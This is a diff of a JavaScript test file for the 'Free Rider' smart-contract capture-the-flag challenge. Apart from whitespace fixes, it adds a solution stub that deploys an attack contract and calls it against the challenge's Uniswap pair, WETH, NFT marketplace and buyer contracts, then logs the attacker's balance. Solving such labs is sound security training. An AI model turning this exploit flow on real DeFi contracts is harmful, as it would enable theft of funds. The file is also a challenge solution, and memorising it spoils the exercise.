@@ -45,7 +45,7 @@ describe('[Challenge] Free Rider', function () {
             this.uniswapFactory.address,
             this.weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // Note that the function takes care of deploying the pair automatically
         await this.token.approve(
@@ -61,7 +61,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
         this.uniswapPair = await UniswapPairFactory.attach(
@@ -98,13 +98,25 @@ describe('[Challenge] Free Rider', function () {
         // Deploy buyer's contract, adding the attacker as the partner
         this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
             attacker.address, // partner
-            this.nft.address, 
+            this.nft.address,
             { value: BUYER_PAYOUT }
         );
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Deploy attack contract
+        const attackContract = await (await ethers.getContractFactory("YouEffingBellend")).deploy();
+        await (await attackContract.connect(attacker).heck(
+            this.uniswapPair.address,
+            this.weth.address,
+            this.marketplace.address,
+            this.buyerContract.address
+        )).wait();
+
+        const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
+        console.log(`Final attacker balance: ${ethers.utils.formatEther(finalAttackerBalance)} ETH`);
     });
 
     after(async function () {
